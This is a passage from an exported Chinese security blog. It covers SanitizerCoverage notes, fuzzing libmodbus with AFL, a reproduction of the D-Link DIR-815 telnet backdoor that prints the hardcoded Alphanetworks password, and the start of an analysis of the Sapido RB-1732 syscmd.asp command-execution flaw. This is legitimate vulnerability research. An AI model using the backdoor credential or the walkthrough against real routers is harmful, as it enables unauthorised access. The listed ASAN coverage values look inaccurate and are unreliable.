<p>注意到注释中说，guards的范围为 [start,stop) ，前闭后开，所以 stop 所指的并不是最后一个guard的位置（0x6f9c7c , 4），而是该位置的下一个位置，即 0x6f9c7c+0x4(一个guard4字节) &#x3D; 0x6f9c80</p>
<p>[start, stop)这个内存区域里存储的是插桩的edges的ID表，guards列表</p>
<p>在__sanitizer_cov_trace_pc_guard_init函数中，对该区域进行ID表的初始化。</p>
<p>在我们对该函数进行自定义时，要加上对该区域的初始化过程，如果不加，则__sanitizer_cov_trace_pc_guard函数不会产生输出，如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711183229378.png" alt="image-20230711183229378"></p>
<p>注释掉初始化代码以后，程序运行结果如图：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711183304926.png" alt="image-20230711183304926"></p>
<p>注：此处的代码示例参见<a href="https://github.com/lcatro/Source-and-Fuzzing/blob/master/12.%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan.md">https://github.com/lcatro/Source-and-Fuzzing/blob/master/12.%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan.md</a></p>
<p>如果未注释，即存在对该区域的初始化操作，则运行结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230711183454366.png" alt="image-20230711183454366"></p>
<h3 id="4-每个边执行的次数在哪里统计？"><a href="#4-每个边执行的次数在哪里统计？" class="headerlink" title="4. 每个边执行的次数在哪里统计？"></a>4. 每个边执行的次数在哪里统计？</h3><p>libfuzzer没有对边的执行次数的计数？</p>
<p>答，计数了，似乎是通过一个全局变量数组来计数的，通过pc来定位是哪一个edge，并作为下标，</p>
<p>libfuzzer覆盖率如何统计？到底有没有统计path coverage</p>
<h3 id="5-如何根据边的覆盖率得到path-coverage？"><a href="#5-如何根据边的覆盖率得到path-coverage？" class="headerlink" title="5. 如何根据边的覆盖率得到path coverage？"></a>5. 如何根据边的覆盖率得到path coverage？</h3><p>path具体是什么样子的？</p>
<h3 id="ASAN-OPTIONS-coverage有哪些取值？"><a href="#ASAN-OPTIONS-coverage有哪些取值？" class="headerlink" title="ASAN_OPTIONS&#x3D;coverage有哪些取值？"></a>ASAN_OPTIONS&#x3D;coverage有哪些取值？</h3><p>除了使用coverage&#x3D;1之外，ASAN_OPTIONS环境变量中的coverage选项还可以设置其他值来启用不同的代码覆盖率收集模式。以下是几个常用的选项：</p>
<p>coverage&#x3D;0：禁用代码覆盖率检测。这是默认设置。<br>coverage&#x3D;1：启用基本块（basic block）级别的代码覆盖率检测。基本块是源代码中连续的一段指令，以及在控制流程中可能跳转到的位置。<br>coverage&#x3D;2：启用PC表（PC-table）级别的代码覆盖率检测。PC表是记录代码中每个指令地址是否被执行的数据结构。<br>coverage&#x3D;3：启用函数级别的代码覆盖率检测。它会计算每个函数被调用的次数和覆盖率。<br>coverage&#x3D;4：启用BB-depth级别的代码覆盖率检测。它会记录每个基本块在执行时的深度信息。<br>请注意，具体可用的coverage取值可能因使用的编译器、操作系统和工具版本而有所差异，以上列出的选项仅为常见示例。可以参考相关文档或工具的官方说明以获取更多详细信息。</p>
]]></content>
      <categories>
        <category>SanitizeCoverage</category>
      </categories>
  </entry>
  <entry>
    <title>fuzz libmodbus by AFL</title>
    <url>/2023/07/03/Fuzz/fuzz-libmodbus-by-AFL/</url>
    <content><![CDATA[<h1 id="fuzz-libmodbus-by-AFL"><a href="#fuzz-libmodbus-by-AFL" class="headerlink" title="fuzz libmodbus by AFL"></a>fuzz libmodbus by AFL</h1><h2 id="下载编译libmodbus库"><a href="#下载编译libmodbus库" class="headerlink" title="下载编译libmodbus库"></a>下载编译libmodbus库</h2><p>libmodbus库源码可从<a href="https://github.com/stephane/libmodbus/">github仓库</a>下载，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/stephane/libmodbus/</span><br></pre></td></tr></table></figure>

<p>下载好后进入源码文件夹，编译命令如下：</p>
<p>需要注意的是：编译使用afl-gcc，而不使用默认的gcc</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd libmodbus</span><br><span class="line">./autogen.sh</span><br><span class="line">CC=afl-gcc CXX=afl-g++ ./configure --enable-static</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<p><code>--enable-static</code>：用于生成静态库</p>
<span id="more"></span>

<p>注意：如果<code>./autogen.sh</code>命令运行出错，提示 autoreconf not found 如下图，则表示缺少<code>autoconf</code>。此外，还需安装<code>libtool</code>。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230703201442354.png" alt="image-20230703201442354"></p>
<p>命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install autoconf libtool</span><br></pre></td></tr></table></figure>

<p>安装完毕后，重新运行<code>autogen.sh</code>后，会提示我们可以运行<code>./configure</code>，如下图。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230703201704667.png" alt="image-20230703201704667"></p>
<p>接着运行 <code>./configure</code> 和 <code>make</code> ，执行成功则会看到如下界面，显示afl插桩提示。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230703202039330.png" alt="image-20230703202039330"></p>
<h2 id="安装Preeny库"><a href="#安装Preeny库" class="headerlink" title="安装Preeny库"></a>安装Preeny库</h2><h3 id="为什么需要安装Preeny库？"><a href="#为什么需要安装Preeny库？" class="headerlink" title="为什么需要安装Preeny库？"></a>为什么需要安装Preeny库？</h3><p><a href="https://so.csdn.net/so/search?q=Modbus&spm=1001.2101.3001.7020">Modbus</a>协议依托socket实现进程间的通信，而AFL本身并未提供对 <code>socket</code> 通信的支持。使用 AFL 对其进行fuzzing 时，需要将其输入输出重定向 <code>stdio</code> 中。纵然可以修改部分代码使其 <code>socket</code> 通信转移到 <code>stdio</code>，但这一过程可能会对 fuzz 的结果造成影响，同时工作量可能也较为繁杂。若是直接修改系统的 <code>socket.h</code>，可能会对其他的程序造成难以估量的影响。<br>这个库利用 <code>LD_PRELOAD</code> 机制，重写了 很多库函数， 其中 <a href="https://github.com/zardus/preeny/blob/master/src/desock.c">desock.c</a> 这个文件负责重写 <code>socket</code> 相关的函数，其实现的功能就是当应用从 <code>socket</code> 获取输入时，其实是从 <code>stdin</code> 获取输入。</p>
<h3 id="安装Preeny的依赖"><a href="#安装Preeny的依赖" class="headerlink" title="安装Preeny的依赖"></a>安装Preeny的依赖</h3><p>Preeny需要使用 libini_config 和 libseccomp 来实现相关功能，在安装 Preeny之前要先安装这两个依赖，否则在编译时汇错，安装命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install libini-config-dev libseccomp-dev</span><br></pre></td></tr></table></figure>

<h3 id="编译安装Preeny"><a href="#编译安装Preeny" class="headerlink" title="编译安装Preeny"></a>编译安装Preeny</h3><p>安装完Preeny需要的依赖后，进入到preeny目录下，<code>make</code>即可。</p>
<p>安装成功后，可以在 <code>preeny/x86_64-linux-gnu</code> 目录下找到编译好的 <code>desock.so</code>，可以通过一个简单的demo来测试 <code>desock.so</code> 是否正常工作，demo如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* demo.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_INFT, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> send_msg[] = <span class="string">&quot;hello, send by send() :\n&quot;</span>;</span><br><span class="line">    send(s, send_msg, <span class="built_in">strlen</span>(send_msg), <span class="number">0</span>);</span><br><span class="line">    recv(s, buf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recv from revv() : %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o sock_test demo.c</span><br><span class="line">LD_PRELOAD=<span class="string">&quot;/home/guoxb/Downloads/preeny/x86_64-linux-gnu/desock.so&quot;</span> ./sock_test</span><br></pre></td></tr></table></figure>

<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230703205209408.png" alt="image-20230703205209408"></p>
<p>可以看到，<code>send</code> 函数成功将消息发送给了 <code>stdout</code> ，而 <code>recv</code> 函数也成功从 <code>stdin</code> 中接受了消息。</p>
<h2 id="编译测试程序"><a href="#编译测试程序" class="headerlink" title="编译测试程序"></a>编译测试程序</h2><p>在 libmodbus 目录下有一个 test 文件，包含几个官方提供的测试样例，可以通过afl-gcc对其进行插桩编译，作为被测程序。此处值得注意的是，在编译时要注意<strong>手动指定modbus库和头文件</strong>，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-gcc bandwidth-server-many-up.c -o server -I ../src/ ../src/.libs/libmodbus.a</span><br></pre></td></tr></table></figure>

<p><code>-I</code> 后面的两个参数分别指定了 <code>modbus.h</code> 和 <code>libmodbus.a</code> 的路径，两者<strong>缺一不可</strong>。</p>
<h2 id="生成测试用例"><a href="#生成测试用例" class="headerlink" title="生成测试用例"></a>生成测试用例</h2><p>可以直接生成一串随机字符串作为 modbus 测试程序的输入，但这种随机生成的数据并不够 interesting。</p>
<p>在 libmodbus 提供的测试用例中，random-test-client 和 random-test-server 这对程序能为我们提供不错的测试数据，在 test&#x2F;README.md 中对这两个程序的描述如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="code">`random-test-server`</span> is necessary to launch a server before running random-test-client. By default, it receives and replies to Modbus query on the localhost and port 1502.</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="code">`random-test-client`</span> sends many different queries to a large range of addresses and values to test the communication between the client and the server.</span><br></pre></td></tr></table></figure>

<p>我们在本地运行这一堆程序，然后通过 tcpdump 工具将数据包保存到本地，从中挑选若干数据包作为输入测试样例，步骤如下：</p>
<ol>
<li><p>首先使用 random-test-server 在 127.0.0.1:1502 起一个 modbus tcp 服务</p>
<p>server端：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">tests$ </span><span class="language-bash">./random-test-server</span> </span><br></pre></td></tr></table></figure>
</li>
<li><p>然后开启 tcpdump 保存数据包到目录 <code>~/modbus.pcap</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo tcpdump -i lo -w ~/modbus.pcap</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最后使用 random-test-client 随机发送各种 modbus 请求到 127.0.0.1:1502</p>
<p>client端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">tests$ </span><span class="language-bash">./random-test-client</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>注：上述三个步骤命令分别在三个不同的终端下运行。</p>
<p>然后写一个脚本（源自参考博客）把 ~&#x2F;modbus.pcap 中由客户端发送的数据包（也就是目的地址是 127.0.0.1:1520 的数据包）的内容提取出来，每个数据包内容保存为一个单独的文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">save_path = <span class="string">&quot;/tmp/seeds/&quot;</span></span><br><span class="line">uuid = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(save_path):</span><br><span class="line">    os.system(<span class="string">&quot;mkdir %s&quot;</span> %(save_path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_file</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">global</span> uuid</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(save_path, uuid), <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(<span class="built_in">str</span>(data))</span><br><span class="line">    uuid += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;write test file: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(uuid)</span><br><span class="line"></span><br><span class="line">modbus_session = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pg = rdpcap(<span class="string">&quot;modbus.pcap&quot;</span>)</span><br><span class="line">session = pg.sessions()</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> session.keys():</span><br><span class="line">    <span class="keyword">if</span> k.endswith(<span class="string">&quot;127.0.0.1:1502&quot;</span>):</span><br><span class="line">        modbus_session = session[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> modbus_session:</span><br><span class="line">    payload = s[TCP].payload</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">4</span>:</span><br><span class="line">        save_to_file(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Total: %d tests&quot;</span> %(uuid)</span><br></pre></td></tr></table></figure>

<p>注意：如果向偷懒直接运行该脚本，则将该脚本放置在 modbus.pcap 同目录下。</p>
<p>运行脚本后，可以得到提取后的测试用例。</p>
<h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p>现在，我们可以使用生成的数据集作为初始样本集进行 fuzz 了。这里最好使用 afl-cmin 来精简下数据集，直接使用的话被AFL判 uselee 的 testcase 挺多的。</p>
<p>fuzz命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD=&quot;/home/guoxb/Downloads/preeny/x86_64-linux-gnu/desock.so&quot; afl-fuzz -i /tmp/seeds/  -o out ./server</span><br></pre></td></tr></table></figure>

<p>不出意外的话，就进入熟悉的AFL界面了，如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230703212153136.png" alt="image-20230703212153136"></p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><blockquote>
<p><a href="https://blog.csdn.net/qq_42768012/article/details/118567601">https://blog.csdn.net/qq_42768012/article/details/118567601</a></p>
<p><a href="https://www.cnblogs.com/hac425/p/9416917.html">https://www.cnblogs.com/hac425/p/9416917.html</a></p>
</blockquote>
<p>参考博客1中还提到了AFL的另一种模式 Persistent Mode，该模式在程序的某个代码位置不断喂<strong>生成的变异数据</strong> 进行 <code>fuzz</code> , 而不用每次喂数据都得重新 <code>fork</code> 一个程序。要使用这个特性则需要编译 llvm_mode。</p>
<p>挖坑，留着以后再看。</p>
]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link_DIR-815后门漏洞</title>
    <url>/2023/04/01/IoT%20%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/D-Link-DIR-815%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="D-Link-DIR-815-后门漏洞"><a href="#D-Link-DIR-815-后门漏洞" class="headerlink" title="D-Link DIR-815 后门漏洞"></a>D-Link DIR-815 后门漏洞</h1><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p>在 DIR-815 路由器中，存在后门漏洞，攻击者可以通过该漏洞获取 Telnet 服务的账号和密码，然后通过获取的账号和密码可以任意登录该型号路由器的 TelNet 服务，进一步执行任意的系统命令。</p>
<span id="more"></span>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先从D-Link官网下载1.02版本的 DIR-815路由器的固件，下载地址：<a href="http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/</a></p>
<p>然后使用 binwalk 工具提取固件文件系统。之后使用 <a href="https://github.com/craigz28/firmwalker">firmwalker</a> 工具收集文件系统的信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ~/Desktop/firmware/_dir815_FW_102.bin.extracted/squashfs-root/ </span><br></pre></td></tr></table></figure>

<p>在 firmwalker 文件所在目录执行上述命令后，会在当前文件夹下生成 firmwalker.txt （也可以自己定义输出文件路径和文件名）。</p>
<p>打开 firmwalker.txt 文件，可以看到有很多 sh 脚本，其中重点关注 &#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh 文件。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230331145515229.png" alt="image-20230331145515229"></p>
<p>查看该文件，可以看到 image_sign 中的数据在 telnetd 服务中用作 Alphanetworks 账户的密码，并启动了 telnetd 服务。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230331145803419.png" alt="image-20230331145803419"></p>
<p>继续查看 &#x2F;etc&#x2F;config&#x2F;image_sign 文件的内容，可以看到被用作 Alphanetworks 账户的密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iot@attifyos ~/D/f/_/squashfs-root&gt; cat etc/config/image_sign</span><br><span class="line">wrgnd08_dlob_dir815</span><br></pre></td></tr></table></figure>



<h2 id="0x30-漏洞复现"><a href="#0x30-漏洞复现" class="headerlink" title="0x30 漏洞复现"></a>0x30 漏洞复现</h2><p>这里使用FAT来模拟的话会出错，还不清楚原因。我们换一个工具，使用  FirmAE 来模拟 D-Link DIR-815 路由器的固件。</p>
<p>PS：AttifyOS 镜像上安装 FirmAE 运行会报错，也不清楚怎么回事，但是用 Ubuntu20.04 安装就可以模拟成功，所以这里换成Ubuntu环境来复现。唉，环境的问题真的是一言难尽！都是玄学！！！</p>
<p>在 FirmAE 工具目录下，执行如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ./run.sh -r dir815 ./firmwares/dir815_FW_102.bin</span></span><br></pre></td></tr></table></figure>

<p>执行完 run.sh 命令后，固件模拟就开始了。FirmAE会先自动分配一个虚拟网卡，并配置相关的 IP 地址（默认分配的是 192.168.0.1 ），然后开始模拟固件。这里需要等待一小段时间，大概6，7分钟的样子，有点小长，模拟成功后如下图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230331151223789.png" alt="image-20230331151223789"></p>
<p>固件模拟成功之后，先使用 Nmap 工具扫描目标地址的端口，确认是否开启了 Telnet 服务，如图：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230331151316442.png" alt="image-20230331151316442"></p>
<p>可以看到，Telnet 服务的 23 端口已开启，这说明在固件模拟成功之后，默认开启了 Telnet 服务。</p>
<p>接下来使用前面获取到的账号 Alphanetworks 和 image_sign 文件读取到的密码来尝试登录 Telnet 服务：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230331151544569.png" alt="image-20230331151544569"></p>
<p>从图中可以看到，我们利用获取到的后门账号和密码，成功地登录 Telnet 服务，并且可以直接执行系统命令。</p>
<p><strong>补充： Telnet 服务相关知识</strong>（来自chatGPT）</p>
<p>Telnet 服务是一种网络协议和应用程序，它允许用户在计算机之间建立远程连接并在远程计算机上执行命令。Telnet 服务通常在服务器上运行，并通过监听默认端口（23）来接收来自客户端的连接请求。以下是一些关于 Telnet 服务的详细介绍：</p>
<ol>
<li>协议和端口：Telnet 服务使用 Telnet 协议来进行通信，该协议是基于 TCP&#x2F;IP 协议的。默认情况下，Telnet 服务监听端口号为 23，客户端可以通过连接该端口来建立与服务器的 Telnet 连接。</li>
<li>连接流程：Telnet 连接流程是基于文本的。当客户端连接到 Telnet 服务器时，服务器会显示欢迎消息并要求用户输入用户名和密码以进行身份验证。验证成功后，用户将获得 shell 提示符，可以在其中输入命令并在远程计算机上执行它们。</li>
<li>安全性：Telnet 服务的主要缺点是它是一种不安全的协议，因为所有的数据（包括用户密码）都是以明文形式传输的。由于安全问题，现在通常不建议使用 Telnet 服务，而是使用更加安全的 SSH（Secure Shell）协议。</li>
<li>使用场景：尽管 Telnet 协议现在不再是主要的远程登录协议，但仍然有一些使用场景，例如在局域网内，管理员可以使用 Telnet 连接到网络设备上执行命令。在一些特殊的环境下，由于历史原因或其他限制，也可能需要使用 Telnet 服务来提供远程访问功能。</li>
</ol>
<p>总之，Telnet 服务是一种基于文本的远程登录协议，它使用 Telnet 协议来进行通信。Telnet 服务通常在服务器上运行，并监听默认端口（23）来接收来自客户端的连接请求。由于安全问题，现在不再建议使用 Telnet 服务，而是使用更加安全的 SSH 协议。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>IoT设备漏洞复现</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Sapido RB-1732路由器命令执行漏洞</title>
    <url>/2023/03/30/IoT%20%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Sapido%20RB-1732%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Sapido-RB-1732路由器命令执行漏洞"><a href="#Sapido-RB-1732路由器命令执行漏洞" class="headerlink" title="Sapido RB-1732路由器命令执行漏洞"></a>Sapido RB-1732路由器命令执行漏洞</h1><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><p>Sapido 是 SAPIDO 公司开发的一款家用路由器，其 RB-1732 系列 v2.0.43 之前的固件版本存在一处命令执行漏洞。所谓命令执行漏洞，是指服务器没有对执行的命令进行过滤，导致用户可以执行任意的系统命令。命令执行漏洞属于高危的漏洞。该漏洞产生的原因是，服务器的 syscmd.asp 页面没有对传递过来的参数进行过滤，这使得用户以参数的形式将系统命令发送给服务器，并在服务器上执行。</p>
<span id="more"></span>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>本次分析使用的固件版本为：RB-1732_TC_v2.0.43</p>
<p><strong>固件下载地址：</strong></p>
<p>百度云：<a href="https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381">https://pan.baidu.com/s/1Gj9RDlAQdCDiaLdLzQ2Aag?pwd=8381</a> </p>
<p>微云：<a href="https://share.weiyun.com/RjicYRKE">https://share.weiyun.com/RjicYRKE</a></p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>本次分析使用的环境是AttifyOS，一个专门用于物联网渗透测试和分析的镜像，里边预装了许多工具，省去了自己部署环境的时间和精力。可通过<a href="https://github.com/adi0x90/attifyos">Github仓库</a>里的下载链接下载。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>将下载得到的固件放入虚拟机中，使用 binwalk 提取文件系统</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230330201508532.png" alt="image-20230330201508532"></p>
<p>可以看到，该固件使用的是 SquashFS 文件系统，也是使用相对比较多的一种文件系统。</p>
<p>在漏洞介绍中，我们提到，这个系列的路由器漏洞存在命令执行漏洞，原因出在这个 syscmd.asp 页面上。所以，我们先用 find 命令找到 syscmd.asp 文件的位置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iot@attifyos ~/D/f/_/squashfs-root&gt; find ./ -name &quot;syscmd.asp&quot;</span><br><span class="line">./web/syscmd.asp</span><br></pre></td></tr></table></figure>

<p>可以发现，syscmd.asp 文件位于 web 目录下，我们进入该目录，打开 syscmd.asp 文件进行分析。查看该文件的源码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;! Copyright (c) Realtek Semiconductor Corp., 2003. All Rights Reserved. -&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html&quot;&gt;</span><br><span class="line">&lt;title&gt;System Command&lt;/title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function saveClick()&#123;</span><br><span class="line">        field = document.formSysCmd.sysCmd ;</span><br><span class="line">        if(field.value.indexOf(&quot;ping&quot;)==0 &amp;&amp; field.value.indexOf(&quot;-c&quot;) &lt; 0)&#123;</span><br><span class="line">                alert(&#x27;please add &quot;-c num&quot; to ping command&#x27;);</span><br><span class="line">                return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(field.value == &quot;&quot;)&#123;</span><br><span class="line">                alert(&quot;Command can&#x27;t be empty&quot;);</span><br><span class="line">                field.value = field.defaultValue;</span><br><span class="line">                field.focus();</span><br><span class="line">                return false ;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;blockquote&gt;</span><br><span class="line">&lt;h2&gt;&lt;font color=&quot;#0000FF&quot;&gt;System Command&lt;/font&gt;&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt;</span><br><span class="line">&lt;table border=0 width=&quot;500&quot; cellspacing=0 cellpadding=0&gt;</span><br><span class="line">  &lt;tr&gt;&lt;font size=2&gt;</span><br><span class="line"> This page can be used to run target system command.</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;&lt;hr size=1 noshade align=top&gt;&lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">  	&lt;td&gt;System Command: &lt;/td&gt;</span><br><span class="line">	&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sysCmd&quot; value=&quot;&quot; size=&quot;20&quot; maxlength=&quot;50&quot;&gt;&lt;/td&gt;</span><br><span class="line">	&lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;Apply&quot; name=&quot;apply&quot; onClick=&#x27;return saveClick()&#x27;&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; value=&quot;/syscmd.asp&quot; name=&quot;submit-url&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">  &lt;script language=&quot;JavaScript&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;textarea rows=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&lt;% sysCmdLog(); %&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;input type=&quot;button&quot; value=&quot;Refresh&quot; name=&quot;refresh&quot; onClick=&quot;javascript: window.location.reload()&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;button&quot; value=&quot;Close&quot; name=&quot;close&quot; onClick=&quot;javascript: window.close()&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/blockquote&gt;</span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以看到第29行处，form 表单中的 action 指向了 &#x2F;goform&#x2F;formSysCmd。第37行处的 input 框的 name 属性为 sysCmd，这个在后边我们会看到他的作用，他其实就是传递我们发送的命令的参数名字。接着我们跟进 formSysCmd 文件，看看他对我们表单提交的数据如何处理。使用 grep 命令全局搜索 formSysCmd 字符串：</p>
